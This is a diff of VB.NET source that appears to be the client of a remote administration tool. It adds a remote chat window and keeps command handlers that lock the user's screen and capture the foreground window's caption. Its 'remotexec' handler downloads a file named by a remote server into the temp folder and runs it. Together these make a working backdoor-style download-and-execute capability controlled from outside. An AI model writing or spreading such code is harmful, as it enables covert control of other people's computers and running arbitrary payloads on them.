@@ -16,6 +16,8 @@ Public Class MainForm
 
     Public mainWebClient As WebClient = New WebClient()
     Public upTime As Integer = 0
+    Dim remoteChatForm As RemoteChat
+
     Private Function GetCaption() As String
         Dim Caption As New StringBuilder(256)
         Dim hWnd As IntPtr = GetForegroundWindow()
@@ -193,30 +195,30 @@ Public Class MainForm
 
 #Region "Tools"
         If actionType = "openremotechat" Then
-            Dim form As New RemoteChat()
-            Invoke(Sub() form.Show())
+            remoteChatForm = New RemoteChat()
+            Invoke(Sub() remoteChatForm.Show())
+            Invoke(Sub() remoteChatForm.StartProcessingMessages())
 
         ElseIf actionType = "closeremotechat" Then
-            Console.WriteLine("close remote chat")
-            Invoke(Sub() RemoteChat.Close())
+            If remoteChatForm IsNot Nothing Then Invoke(Sub() remoteChatForm.Close())
 
         ElseIf actionType = "remotexec" Then
-            ' TODO : check this feature
-            Dim filename As String = actionContent(0)
-            Dim client As New WebClient
-            client.DownloadFile(My.Settings.vpsurl & "/files/" & filename, filename)
-            Try
-                File.Move(filename, Path.GetTempPath & filename)
-                File.Delete(filename)
-            Catch
-            End Try
-            Process.Start(Path.GetTempPath & filename)
+                ' TODO : check this feature
+                Dim filename As String = actionContent(0)
+                Dim client As New WebClient
+                client.DownloadFile(My.Settings.vpsurl & "/files/" & filename, filename)
+                Try
+                    File.Move(filename, Path.GetTempPath & filename)
+                    File.Delete(filename)
+                Catch
+                End Try
+                Process.Start(Path.GetTempPath & filename)
 
-        ElseIf actionType = "lockuser" Then
-            Invoke(Sub() LockedWindow.Show())
+            ElseIf actionType = "lockuser" Then
+                Invoke(Sub() LockedWindow.Show())
 
-        ElseIf actionType = "unlockuser" Then
-            Invoke(Sub() LockedWindow.Hide())
+            ElseIf actionType = "unlockuser" Then
+                Invoke(Sub() LockedWindow.Hide())
         End If
 
 #End Region
